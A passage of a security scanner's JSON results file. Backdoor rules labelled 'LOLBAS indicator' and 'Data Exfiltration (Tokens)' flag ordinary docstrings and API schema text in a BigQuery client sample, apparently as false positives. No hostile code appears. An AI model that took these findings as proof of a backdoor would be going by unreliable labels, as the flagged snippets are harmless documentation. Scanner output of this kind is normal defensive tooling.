                      "markdown": "`      does not contain quoted sections, set the property value to an empty\n      string. If your data contains quoted newline characters, you must also\n      set the allowQuotedNewlines property to true.\n    skipLeadingRows: [Optional] The number of rows at the top of a CSV file\n      that BigQuery will skip when reading the data. The default value is 0.\n      This property is useful if you have header rows in the file that should\n      be skipped.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/bigquery_sample/bigquery_v2/bigquery_v2_messages.py"
                },
                "region": {
                  "startLine": 134,
                  "startColumn": 53,
                  "endLine": 134,
                  "endColumn": 62,
                  "snippet": {
                    "text": "    projectId: [Required] Project ID of the query job\n    startIndex: Zero-based index of the starting row\n    timeoutMs: How long to wait for the query to complete, in milliseconds,\n      before returning. Default is 10 seconds. If the timeout passes before\n      the job completes, the 'jobComplete' field in the response will be false\n  \"\"\"\n\n",
                    "rendered": {
                      "text": "    projectId: [Required] Project ID of the query job\n    startIndex: Zero-based index of the starting row\n    timeoutMs: How long to wait for the query to complete, in milliseconds,\n      before returning. Default is 10 seconds. If the timeout passes before\n      the job completes, the 'jobComplete' field in the response will be false\n  \"\"\"\n\n",
                      "markdown": "`    projectId: [Required] Project ID of the query job\n    startIndex: Zero-based index of the starting row\n    timeoutMs: How long to wait for the query to complete, in milliseconds,\n      before returning. Default is 10 seconds. If the timeout passes before\n      the job completes, the 'jobComplete' field in the response will be false\n  \"\"\"\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/bigquery_sample/bigquery_v2/bigquery_v2_messages.py"
                },
                "region": {
                  "startLine": 1710,
                  "startColumn": 3,
                  "endLine": 1710,
                  "endColumn": 13,
                  "snippet": {
                    "text": "  alt = _messages.EnumField('AltValueValuesEnum', 1, default='json')\n  fields = _messages.StringField(2)\n  key = _messages.StringField(3)\n  oauth_token = _messages.StringField(4)\n  prettyPrint = _messages.BooleanField(5, default=True)\n  quotaUser = _messages.StringField(6)\n  trace = _messages.StringField(7)\n",
                    "rendered": {
                      "text": "  alt = _messages.EnumField('AltValueValuesEnum', 1, default='json')\n  fields = _messages.StringField(2)\n  key = _messages.StringField(3)\n  oauth_token = _messages.StringField(4)\n  prettyPrint = _messages.BooleanField(5, default=True)\n  quotaUser = _messages.StringField(6)\n  trace = _messages.StringField(7)\n",
                      "markdown": "`  alt = _messages.EnumField('AltValueValuesEnum', 1, default='json')\n  fields = _messages.StringField(2)\n  key = _messages.StringField(3)\n  oauth_token = _messages.StringField(4)\n  prettyPrint = _messages.BooleanField(5, default=True)\n  quotaUser = _messages.StringField(6)\n  trace = _messages.StringField(7)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/bigquery_sample/bigquery_v2/bigquery_v2_messages.py"
                },
                "region": {
                  "startLine": 1688,
                  "startColumn": 5,
                  "endLine": 1688,
                  "endColumn": 15,
                  "snippet": {
                    "text": "    key: API key. Your API key identifies your project and provides you with\n      API access, quota, and reports. Required unless you provide an OAuth 2.0\n      token.\n    oauth_token: OAuth 2.0 token for the current user.\n    prettyPrint: Returns response with indentations and line breaks.\n    quotaUser: Available to use for quota purposes for server-side\n      applications. Can be any arbitrary string assigned to a user, but should\n",
                    "rendered": {
                      "text": "    key: API key. Your API key identifies your project and provides you with\n      API access, quota, and reports. Required unless you provide an OAuth 2.0\n      token.\n    oauth_token: OAuth 2.0 token for the current user.\n    prettyPrint: Returns response with indentations and line breaks.\n    quotaUser: Available to use for quota purposes for server-side\n      applications. Can be any arbitrary string assigned to a user, but should\n",
                      "markdown": "`    key: API key. Your API key identifies your project and provides you with\n      API access, quota, and reports. Required unless you provide an OAuth 2.0\n      token.\n    oauth_token: OAuth 2.0 token for the current user.\n    prettyPrint: Returns response with indentations and line breaks.\n    quotaUser: Available to use for quota purposes for server-side\n      applications. Can be any arbitrary string assigned to a user, but should\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/bigquery_sample/bigquery_v2.json"
                },
                "region": {
                  "startLine": 2596,
                  "startColumn": 66,
                  "endLine": 2596,
                  "endColumn": 74,
                  "snippet": {
                    "text": "     \"id\": \"bigquery.tables.update\",\n     \"path\": \"projects/{projectId}/datasets/{datasetId}/tables/{tableId}\",\n     \"httpMethod\": \"PUT\",\n     \"description\": \"Updates information in an existing table. The update method replaces the entire table resource, whereas the patch method only replaces fields that are provided in the submitted table resource.\",\n     \"parameters\": {\n      \"datasetId\": {\n       \"type\": \"string\",\n",
                    "rendered": {
                      "text": "     \"id\": \"bigquery.tables.update\",\n     \"path\": \"projects/{projectId}/datasets/{datasetId}/tables/{tableId}\",\n     \"httpMethod\": \"PUT\",\n     \"description\": \"Updates information in an existing table. The update method replaces the entire table resource, whereas the patch method only replaces fields that are provided in the submitted table resource.\",\n     \"parameters\": {\n      \"datasetId\": {\n       \"type\": \"string\",\n",
                      "markdown": "`     \"id\": \"bigquery.tables.update\",\n     \"path\": \"projects/{projectId}/datasets/{datasetId}/tables/{tableId}\",\n     \"httpMethod\": \"PUT\",\n     \"description\": \"Updates information in an existing table. The update method replaces the entire table resource, whereas the patch method only replaces fields that are provided in the submitted table resource.\",\n     \"parameters\": {\n      \"datasetId\": {\n       \"type\": \"string\",\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/bigquery_sample/bigquery_v2.json"
                },
                "region": {
                  "startLine": 2555,
                  "startColumn": 66,
                  "endLine": 2555,
                  "endColumn": 74,
                  "snippet": {
                    "text": "     \"id\": \"bigquery.tables.patch\",\n     \"path\": \"projects/{projectId}/datasets/{datasetId}/tables/{tableId}\",\n     \"httpMethod\": \"PATCH\",\n     \"description\": \"Updates information in an existing table. The update method replaces the entire table resource, whereas the patch method only replaces fields that are provided in the submitted table resource. This method supports patch semantics.\",\n     \"parameters\": {\n      \"datasetId\": {\n       \"type\": \"string\",\n",
                    "rendered": {
                      "text": "     \"id\": \"bigquery.tables.patch\",\n     \"path\": \"projects/{projectId}/datasets/{datasetId}/tables/{tableId}\",\n     \"httpMethod\": \"PATCH\",\n     \"description\": \"Updates information in an existing table. The update method replaces the entire table resource, whereas the patch method only replaces fields that are provided in the submitted table resource. This method supports patch semantics.\",\n     \"parameters\": {\n      \"datasetId\": {\n       \"type\": \"string\",\n",
                      "markdown": "`     \"id\": \"bigquery.tables.patch\",\n     \"path\": \"projects/{projectId}/datasets/{datasetId}/tables/{tableId}\",\n     \"httpMethod\": \"PATCH\",\n     \"description\": \"Updates information in an existing table. The update method replaces the entire table resource, whereas the patch method only replaces fields that are provided in the submitted table resource. This method supports patch semantics.\",\n     \"parameters\": {\n      \"datasetId\": {\n       \"type\": \"string\",\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/bigquery_sample/bigquery_v2.json"
                },
                "region": {
                  "startLine": 2302,
                  "startColumn": 58,
                  "endLine": 2302,
                  "endColumn": 62,
                  "snippet": {
                    "text": "     \"id\": \"bigquery.tabledata.insertAll\",\n     \"path\": \"projects/{projectId}/datasets/{datasetId}/tables/{tableId}/insertAll\",\n     \"httpMethod\": \"POST\",\n     \"description\": \"Streams data into BigQuery one record at a time without needing to run a load job. Requires the WRITER dataset role.\",\n     \"parameters\": {\n      \"datasetId\": {\n       \"type\": \"string\",\n",
                    "rendered": {
                      "text": "     \"id\": \"bigquery.tabledata.insertAll\",\n     \"path\": \"projects/{projectId}/datasets/{datasetId}/tables/{tableId}/insertAll\",\n     \"httpMethod\": \"POST\",\n     \"description\": \"Streams data into BigQuery one record at a time without needing to run a load job. Requires the WRITER dataset role.\",\n     \"parameters\": {\n      \"datasetId\": {\n       \"type\": \"string\",\n",
                      "markdown": "`     \"id\": \"bigquery.tabledata.insertAll\",\n     \"path\": \"projects/{projectId}/datasets/{datasetId}/tables/{tableId}/insertAll\",\n     \"httpMethod\": \"POST\",\n     \"description\": \"Streams data into BigQuery one record at a time without needing to run a load job. Requires the WRITER dataset role.\",\n     \"parameters\": {\n      \"datasetId\": {\n       \"type\": \"string\",\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/bigquery_sample/bigquery_v2.json"
                },
                "region": {
                  "startLine": 1967,
                  "startColumn": 68,
                  "endLine": 1967,
                  "endColumn": 76,
                  "snippet": {
                    "text": "     \"id\": \"bigquery.datasets.update\",\n     \"path\": \"projects/{projectId}/datasets/{datasetId}\",\n     \"httpMethod\": \"PUT\",\n     \"description\": \"Updates information in an existing dataset. The update method replaces the entire dataset resource, whereas the patch method only replaces fields that are provided in the submitted dataset resource.\",\n     \"parameters\": {\n      \"datasetId\": {\n       \"type\": \"string\",\n",
                    "rendered": {
                      "text": "     \"id\": \"bigquery.datasets.update\",\n     \"path\": \"projects/{projectId}/datasets/{datasetId}\",\n     \"httpMethod\": \"PUT\",\n     \"description\": \"Updates information in an existing dataset. The update method replaces the entire dataset resource, whereas the patch method only replaces fields that are provided in the submitted dataset resource.\",\n     \"parameters\": {\n      \"datasetId\": {\n       \"type\": \"string\",\n",
                      "markdown": "`     \"id\": \"bigquery.datasets.update\",\n     \"path\": \"projects/{projectId}/datasets/{datasetId}\",\n     \"httpMethod\": \"PUT\",\n     \"description\": \"Updates information in an existing dataset. The update method replaces the entire dataset resource, whereas the patch method only replaces fields that are provided in the submitted dataset resource.\",\n     \"parameters\": {\n      \"datasetId\": {\n       \"type\": \"string\",\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/bigquery_sample/bigquery_v2.json"
                },
                "region": {
                  "startLine": 1933,
                  "startColumn": 68,
                  "endLine": 1933,
                  "endColumn": 76,
                  "snippet": {
                    "text": "     \"id\": \"bigquery.datasets.patch\",\n     \"path\": \"projects/{projectId}/datasets/{datasetId}\",\n     \"httpMethod\": \"PATCH\",\n     \"description\": \"Updates information in an existing dataset. The update method replaces the entire dataset resource, whereas the patch method only replaces fields that are provided in the submitted dataset resource. This method supports patch semantics.\",\n     \"parameters\": {\n      \"datasetId\": {\n       \"type\": \"string\",\n",
                    "rendered": {
                      "text": "     \"id\": \"bigquery.datasets.patch\",\n     \"path\": \"projects/{projectId}/datasets/{datasetId}\",\n     \"httpMethod\": \"PATCH\",\n     \"description\": \"Updates information in an existing dataset. The update method replaces the entire dataset resource, whereas the patch method only replaces fields that are provided in the submitted dataset resource. This method supports patch semantics.\",\n     \"parameters\": {\n      \"datasetId\": {\n       \"type\": \"string\",\n",
                      "markdown": "`     \"id\": \"bigquery.datasets.patch\",\n     \"path\": \"projects/{projectId}/datasets/{datasetId}\",\n     \"httpMethod\": \"PATCH\",\n     \"description\": \"Updates information in an existing dataset. The update method replaces the entire dataset resource, whereas the patch method only replaces fields that are provided in the submitted dataset resource. This method supports patch semantics.\",\n     \"parameters\": {\n      \"datasetId\": {\n       \"type\": \"string\",\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/bigquery_sample/bigquery_v2.json"
                },
                "region": {
                  "startLine": 1339,
                  "startColumn": 136,
                  "endLine": 1339,
                  "endColumn": 144,
                  "snippet": {
                    "text": "    },\n    \"numDmlAffectedRows\": {\n     \"type\": \"string\",\n     \"description\": \"[Output-only, Experimental] The number of rows affected by a DML statement. Present only for DML statements INSERT, UPDATE or DELETE.\",\n     \"format\": \"int64\"\n    },\n    \"pageToken\": {\n",
                    "rendered": {
                      "text": "    },\n    \"numDmlAffectedRows\": {\n     \"type\": \"string\",\n     \"description\": \"[Output-only, Experimental] The number of rows affected by a DML statement. Present only for DML statements INSERT, UPDATE or DELETE.\",\n     \"format\": \"int64\"\n    },\n    \"pageToken\": {\n",
                      "markdown": "`    },\n    \"numDmlAffectedRows\": {\n     \"type\": \"string\",\n     \"description\": \"[Output-only, Experimental] The number of rows affected by a DML statement. Present only for DML statements INSERT, UPDATE or DELETE.\",\n     \"format\": \"int64\"\n    },\n    \"pageToken\": {\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/bigquery_sample/bigquery_v2.json"
                },
                "region": {
                  "startLine": 1212,
                  "startColumn": 47,
                  "endLine": 1212,
                  "endColumn": 51,
                  "snippet": {
                    "text": "    },\n    \"projects\": {\n     \"type\": \"array\",\n     \"description\": \"Projects to which you have at least READ access.\",\n     \"items\": {\n      \"type\": \"object\",\n      \"properties\": {\n",
                    "rendered": {
                      "text": "    },\n    \"projects\": {\n     \"type\": \"array\",\n     \"description\": \"Projects to which you have at least READ access.\",\n     \"items\": {\n      \"type\": \"object\",\n      \"properties\": {\n",
                      "markdown": "`    },\n    \"projects\": {\n     \"type\": \"array\",\n     \"description\": \"Projects to which you have at least READ access.\",\n     \"items\": {\n      \"type\": \"object\",\n      \"properties\": {\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/bigquery_sample/bigquery_v2.json"
                },
                "region": {
                  "startLine": 1087,
                  "startColumn": 136,
                  "endLine": 1087,
                  "endColumn": 144,
                  "snippet": {
                    "text": "    },\n    \"numDmlAffectedRows\": {\n     \"type\": \"string\",\n     \"description\": \"[Output-only, Experimental] The number of rows affected by a DML statement. Present only for DML statements INSERT, UPDATE or DELETE.\",\n     \"format\": \"int64\"\n    },\n    \"queryPlan\": {\n",
                    "rendered": {
                      "text": "    },\n    \"numDmlAffectedRows\": {\n     \"type\": \"string\",\n     \"description\": \"[Output-only, Experimental] The number of rows affected by a DML statement. Present only for DML statements INSERT, UPDATE or DELETE.\",\n     \"format\": \"int64\"\n    },\n    \"queryPlan\": {\n",
                      "markdown": "`    },\n    \"numDmlAffectedRows\": {\n     \"type\": \"string\",\n     \"description\": \"[Output-only, Experimental] The number of rows affected by a DML statement. Present only for DML statements INSERT, UPDATE or DELETE.\",\n     \"format\": \"int64\"\n    },\n    \"queryPlan\": {\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/bigquery_sample/bigquery_v2.json"
                },
                "region": {
                  "startLine": 941,
                  "startColumn": 602,
                  "endLine": 941,
                  "endColumn": 610,
                  "snippet": {
                    "text": "le. WRITE_EMPTY: If the table already exists and contains data, a 'duplicate' error is returned in the job result. The default value is WRITE_EMPTY. Each action is atomic and only occurs if BigQuery is able to complete the job successfully. Creation, truncation and append actions occur as one atomic update upon job completion.\"\n    }\n   }\n  },\n  \"JobList\": {\n   \"id\": \"JobList\",\n   \"type\": \"object\",\n   \"properties\": {\n    \"etag\": {\n     \"type\": \"string\",\n     \"description\": \"A hash of this page of results.\"\n    },\n    \"jobs\": {\n     \"type\": \"array\",\n     \"description\": \"List of jobs that were requested",
                    "rendered": {
                      "text": "le. WRITE_EMPTY: If the table already exists and contains data, a 'duplicate' error is returned in the job result. The default value is WRITE_EMPTY. Each action is atomic and only occurs if BigQuery is able to complete the job successfully. Creation, truncation and append actions occur as one atomic update upon job completion.\"\n    }\n   }\n  },\n  \"JobList\": {\n   \"id\": \"JobList\",\n   \"type\": \"object\",\n   \"properties\": {\n    \"etag\": {\n     \"type\": \"string\",\n     \"description\": \"A hash of this page of results.\"\n    },\n    \"jobs\": {\n     \"type\": \"array\",\n     \"description\": \"List of jobs that were requested",
                      "markdown": "`le. WRITE_EMPTY: If the table already exists and contains data, a 'duplicate' error is returned in the job result. The default value is WRITE_EMPTY. Each action is atomic and only occurs if BigQuery is able to complete the job successfully. Creation, truncation and append actions occur as one atomic update upon job completion.\"\n    }\n   }\n  },\n  \"JobList\": {\n   \"id\": \"JobList\",\n   \"type\": \"object\",\n   \"properties\": {\n    \"etag\": {\n     \"type\": \"string\",\n     \"description\": \"A hash of this page of results.\"\n    },\n    \"jobs\": {\n     \"type\": \"array\",\n     \"description\": \"List of jobs that were requested`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/bigquery_sample/bigquery_v2.json"
                },
                "region": {
                  "startLine": 922,
                  "startColumn": 410,
                  "endLine": 922,
                  "endColumn": 418,
                  "snippet": {
                    "text": "   \"properties\": {\n    \"createDisposition\": {\n     \"type\": \"string\",\n     \"description\": \"[Optional] Specifies whether the job is allowed to create new tables. The following values are supported: CREATE_IF_NEEDED: If the table does not exist, BigQuery creates the table. CREATE_NEVER: The table must already exist. If it does not, a 'notFound' error is returned in the job result. The default value is CREATE_IF_NEEDED. Creation, truncation and append actions occur as one atomic update upon job completion.\"\n    },\n    \"destinationTable\": {\n     \"$ref\": \"TableReference\",\n",
                    "rendered": {
                      "text": "   \"properties\": {\n    \"createDisposition\": {\n     \"type\": \"string\",\n     \"description\": \"[Optional] Specifies whether the job is allowed to create new tables. The following values are supported: CREATE_IF_NEEDED: If the table does not exist, BigQuery creates the table. CREATE_NEVER: The table must already exist. If it does not, a 'notFound' error is returned in the job result. The default value is CREATE_IF_NEEDED. Creation, truncation and append actions occur as one atomic update upon job completion.\"\n    },\n    \"destinationTable\": {\n     \"$ref\": \"TableReference\",\n",
                      "markdown": "`   \"properties\": {\n    \"createDisposition\": {\n     \"type\": \"string\",\n     \"description\": \"[Optional] Specifies whether the job is allowed to create new tables. The following values are supported: CREATE_IF_NEEDED: If the table does not exist, BigQuery creates the table. CREATE_NEVER: The table must already exist. If it does not, a 'notFound' error is returned in the job result. The default value is CREATE_IF_NEEDED. Creation, truncation and append actions occur as one atomic update upon job completion.\"\n    },\n    \"destinationTable\": {\n     \"$ref\": \"TableReference\",\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/bigquery_sample/bigquery_v2.json"
                },
                "region": {
                  "startLine": 912,
                  "startColumn": 602,
                  "endLine": 912,
                  "endColumn": 610,
                  "snippet": {
                    "text": "le. WRITE_EMPTY: If the table already exists and contains data, a 'duplicate' error is returned in the job result. The default value is WRITE_EMPTY. Each action is atomic and only occurs if BigQuery is able to complete the job successfully. Creation, truncation and append actions occur as one atomic update upon job completion.\"\n    }\n   }\n  },\n  \"JobConfigurationTableCopy\": {\n   \"id\": \"JobConfigurationTableCopy\",\n   \"type\": \"object\",\n   \"properties\": {\n    \"createDisposition\": {\n     \"type\": \"string\",\n     \"description\": \"[Optional] Specifies whether the job is allowed to create new tables. The follow",
                    "rendered": {
                      "text": "le. WRITE_EMPTY: If the table already exists and contains data, a 'duplicate' error is returned in the job result. The default value is WRITE_EMPTY. Each action is atomic and only occurs if BigQuery is able to complete the job successfully. Creation, truncation and append actions occur as one atomic update upon job completion.\"\n    }\n   }\n  },\n  \"JobConfigurationTableCopy\": {\n   \"id\": \"JobConfigurationTableCopy\",\n   \"type\": \"object\",\n   \"properties\": {\n    \"createDisposition\": {\n     \"type\": \"string\",\n     \"description\": \"[Optional] Specifies whether the job is allowed to create new tables. The follow",
                      "markdown": "`le. WRITE_EMPTY: If the table already exists and contains data, a 'duplicate' error is returned in the job result. The default value is WRITE_EMPTY. Each action is atomic and only occurs if BigQuery is able to complete the job successfully. Creation, truncation and append actions occur as one atomic update upon job completion.\"\n    }\n   }\n  },\n  \"JobConfigurationTableCopy\": {\n   \"id\": \"JobConfigurationTableCopy\",\n   \"type\": \"object\",\n   \"properties\": {\n    \"createDisposition\": {\n     \"type\": \"string\",\n     \"description\": \"[Optional] Specifies whether the job is allowed to create new tables. The follow`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/bigquery_sample/bigquery_v2.json"
                },
                "region": {
                  "startLine": 882,
                  "startColumn": 135,
                  "endLine": 882,
                  "endColumn": 143,
                  "snippet": {
                    "text": "  },\n    \"query\": {\n     \"type\": \"string\",\n     \"description\": \"[Required] BigQuery SQL query to execute.\"\n    },\n    \"schemaUpdateOptions\": {\n     \"type\": \"array\",\n     \"description\": \"[Experimental] Allows the schema of the desitination table to be updated as a side effect of the query job. Schema update options are supported in two cases: when writeDisposition is WRITE_APPEND; when writeDisposition is WRITE_TRUNCATE and the destination table is a partition of a table, specified by partition decorators. For normal tables, WRITE_TRUNCATE will always overwrite the schema. One or more of the following ",
                    "rendered": {
                      "text": "  },\n    \"query\": {\n     \"type\": \"string\",\n     \"description\": \"[Required] BigQuery SQL query to execute.\"\n    },\n    \"schemaUpdateOptions\": {\n     \"type\": \"array\",\n     \"description\": \"[Experimental] Allows the schema of the desitination table to be updated as a side effect of the query job. Schema update options are supported in two cases: when writeDisposition is WRITE_APPEND; when writeDisposition is WRITE_TRUNCATE and the destination table is a partition of a table, specified by partition decorators. For normal tables, WRITE_TRUNCATE will always overwrite the schema. One or more of the following ",
                      "markdown": "`  },\n    \"query\": {\n     \"type\": \"string\",\n     \"description\": \"[Required] BigQuery SQL query to execute.\"\n    },\n    \"schemaUpdateOptions\": {\n     \"type\": \"array\",\n     \"description\": \"[Experimental] Allows the schema of the desitination table to be updated as a side effect of the query job. Schema update options are supported in two cases: when writeDisposition is WRITE_APPEND; when writeDisposition is WRITE_TRUNCATE and the destination table is a partition of a table, specified by partition decorators. For normal tables, WRITE_TRUNCATE will always overwrite the schema. One or more of the following `"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/bigquery_sample/bigquery_v2.json"
                },
                "region": {
                  "startLine": 842,
                  "startColumn": 410,
                  "endLine": 842,
                  "endColumn": 418,
                  "snippet": {
                    "text": "    },\n    \"createDisposition\": {\n     \"type\": \"string\",\n     \"description\": \"[Optional] Specifies whether the job is allowed to create new tables. The following values are supported: CREATE_IF_NEEDED: If the table does not exist, BigQuery creates the table. CREATE_NEVER: The table must already exist. If it does not, a 'notFound' error is returned in the job result. The default value is CREATE_IF_NEEDED. Creation, truncation and append actions occur as one atomic update upon job completion.\"\n    },\n    \"defaultDataset\": {\n     \"$ref\": \"DatasetReference\",\n",
                    "rendered": {
                      "text": "    },\n    \"createDisposition\": {\n     \"type\": \"string\",\n     \"description\": \"[Optional] Specifies whether the job is allowed to create new tables. The following values are supported: CREATE_IF_NEEDED: If the table does not exist, BigQuery creates the table. CREATE_NEVER: The table must already exist. If it does not, a 'notFound' error is returned in the job result. The default value is CREATE_IF_NEEDED. Creation, truncation and append actions occur as one atomic update upon job completion.\"\n    },\n    \"defaultDataset\": {\n     \"$ref\": \"DatasetReference\",\n",
                      "markdown": "`    },\n    \"createDisposition\": {\n     \"type\": \"string\",\n     \"description\": \"[Optional] Specifies whether the job is allowed to create new tables. The following values are supported: CREATE_IF_NEEDED: If the table does not exist, BigQuery creates the table. CREATE_NEVER: The table must already exist. If it does not, a 'notFound' error is returned in the job result. The default value is CREATE_IF_NEEDED. Creation, truncation and append actions occur as one atomic update upon job completion.\"\n    },\n    \"defaultDataset\": {\n     \"$ref\": \"DatasetReference\",\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/bigquery_sample/bigquery_v2.json"
                },
                "region": {
                  "startLine": 838,
                  "startColumn": 89,
                  "endLine": 838,
                  "endColumn": 93,
                  "snippet": {
                    "text": "   \"properties\": {\n    \"allowLargeResults\": {\n     \"type\": \"boolean\",\n     \"description\": \"If true, allows the query to produce arbitrarily large result tables at a slight cost in performance. Requires destinationTable to be set.\"\n    },\n    \"createDisposition\": {\n     \"type\": \"string\",\n",
                    "rendered": {
                      "text": "   \"properties\": {\n    \"allowLargeResults\": {\n     \"type\": \"boolean\",\n     \"description\": \"If true, allows the query to produce arbitrarily large result tables at a slight cost in performance. Requires destinationTable to be set.\"\n    },\n    \"createDisposition\": {\n     \"type\": \"string\",\n",
                      "markdown": "`   \"properties\": {\n    \"allowLargeResults\": {\n     \"type\": \"boolean\",\n     \"description\": \"If true, allows the query to produce arbitrarily large result tables at a slight cost in performance. Requires destinationTable to be set.\"\n    },\n    \"createDisposition\": {\n     \"type\": \"string\",\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
